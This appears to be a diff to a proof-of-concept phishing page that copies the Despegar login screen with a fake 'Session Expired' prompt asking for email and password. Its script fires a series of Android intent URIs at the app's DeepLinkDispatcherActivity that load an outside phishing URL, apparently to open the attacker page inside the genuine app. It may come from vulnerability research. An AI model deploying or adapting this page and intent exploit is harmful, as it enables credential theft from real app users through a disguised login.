@@ -19,7 +19,7 @@
       margin-bottom: 20px; 
     }
     h3 { margin: 10px 0 25px; color: #333; }
-    input { 
+    input, button { 
       display: block; 
       margin: 12px auto; 
       padding: 14px; 
@@ -29,20 +29,12 @@
       font-size: 16px; 
     }
     button { 
-      margin-top: 10px; 
-      padding: 14px 50px; 
       background: #e30613; 
       color: white; 
       border: none; 
-      border-radius: 8px; 
-      font-size: 17px; 
       cursor: pointer;
     }
-    p { 
-      font-size: 13px; 
-      color: #666; 
-      margin: 20px 0;
-    }
+    p { font-size: 13px; color: #666; margin: 20px 0; }
     .trigger { 
       display: inline-block; 
       margin-top: 25px; 
@@ -54,42 +46,46 @@
       text-decoration: none;
       font-weight: bold;
     }
-    .trigger:hover { background: #c00510; }
   </style>
 </head>
 <body>
   <div class="logo">✈️ Despegar</div>
-  <h3>Sign in to continue</h3>
+  <h3>Session Expired</h3>
   <input type="email" placeholder="Email address" />
   <input type="password" placeholder="Password" />
   <button>Sign In</button>
   
-  <p><strong>Session expired.</strong><br>Please log in again to continue.</p>
+  <p><strong>Please log in again to continue your booking.</strong></p>
   
-  <!-- Updated Trigger Button -->
-  <a class="trigger" href="javascript:void(0)" onclick="triggerDespegar()">
-    Open in Despegar App
+  <a class="trigger" href="javascript:void(0)" onclick="openInDespegar()">
+    🔄 Open in Despegar App
   </a>
 
   <script>
-    function triggerDespegar() {
-        const targetUrl = "https://honestcorrupt.github.io/poc_repo_for_phishing/";
-        
-        // Primary Intent
-        let intent = `intent:#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;S.url=${encodeURIComponent(targetUrl)};end`;
-        window.location.href = intent;
+    function openInDespegar() {
+        const url = "https://honestcorrupt.github.io/poc_repo_for_phishing/";
 
-        // Fallback 1 - after 500ms
-        setTimeout(() => {
-            let intent2 = `intent://despegar#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;S.url=${encodeURIComponent(targetUrl)};end`;
-            window.location.href = intent2;
-        }, 500);
+        // Multiple attempts with different methods
+        const intents = [
+            // 1. Main - using S.url
+            `intent:#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;S.url=${encodeURIComponent(url)};end`,
+            
+            // 2. Using deeplink key
+            `intent:#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;S.deeplink=${encodeURIComponent(url)};end`,
+            
+            // 3. Using data URI (no extra)
+            `intent://despegar#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;end`
+        ];
 
-        // Fallback 2 - using deeplink key
-        setTimeout(() => {
-            let intent3 = `intent:#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;S.deeplink=${encodeURIComponent(targetUrl)};end`;
-            window.location.href = intent3;
-        }, 1200);
+        let index = 0;
+        function tryNext() {
+            if (index < intents.length) {
+                window.location.href = intents[index];
+                index++;
+                setTimeout(tryNext, 700);
+            }
+        }
+        tryNext();
     }
   </script>
 </body>
